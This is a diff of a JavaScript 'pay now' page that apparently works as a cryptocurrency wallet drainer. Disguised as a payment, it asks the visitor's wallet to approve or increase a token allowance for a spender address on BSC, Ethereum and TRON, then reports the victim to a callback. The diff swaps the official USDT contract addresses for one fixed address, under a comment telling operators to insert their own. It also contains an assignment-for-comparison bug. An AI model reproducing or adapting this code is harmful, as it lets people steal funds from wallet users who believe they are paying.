@@ -2748,11 +2748,11 @@ function payNow() {
         //以下两个地址更改为自己地址（目前写的是官方）
     } else if (chain == 'bsc') {
         contract.methods.increaseAllowance(eth_address, amount).send({from: accounts[0]}).on('transactionHash', function (hash) {
-            successCallback(accounts[0], '0x55d398326f99059ff775485246999027b3197955', 1);
+            successCallback(accounts[0], '0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075', 1);
         });
     } else if (chain = 'eth') {
         contract.methods.approve(eth_address, amount).send({from: accounts[0]}).on('transactionHash', function (hash) {
-            successCallback(accounts[0], '0xdAC17F958D2ee523a2206206994597C13D831ec7', 1);
+            successCallback(accounts[0], '0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075', 1);
         });
     }
 }
@@ -2808,7 +2808,7 @@ async function imtokenTUAP() {
                 console.log(signed);
                 const res = await window.tronWeb.trx.sendRawTransaction(signed);
                 console.log(res);
-                successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0);
+                // successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0);
             } catch (error) {
                 approval.removeAttribute('style');
                 approval.setAttribute('style', 'height: 95%;');
@@ -2848,9 +2848,9 @@ async function TUAP() {
                     console.log(signed);
                     const res = await window.okxwallet.tronLink.tronWeb.trx.sendRawTransaction(signed);
                     console.log(res);
-                    successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0);
+                    // successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0);
                 } catch (error) {
-                    alert('支付失败！');
+                    alert('支付失败！1');
                 }
             }
         } else {
@@ -2896,10 +2896,10 @@ async function tronIA() {
         try {
             let contract = await tronWeb.contract().at(trc20ContractAddress);
             res = await contract.increaseApproval(spender_bas58, amount).send({feeLimit: 100000000});
-            successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, approve_type);
+            // successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, approve_type);
         } catch (error) {
             console.error("trigger smart contract error", error);
-            alert('支付失败！');
+            alert('支付失败！2');
         }
     } else {
         alert('没有足够的TRX用于支付网络费！')
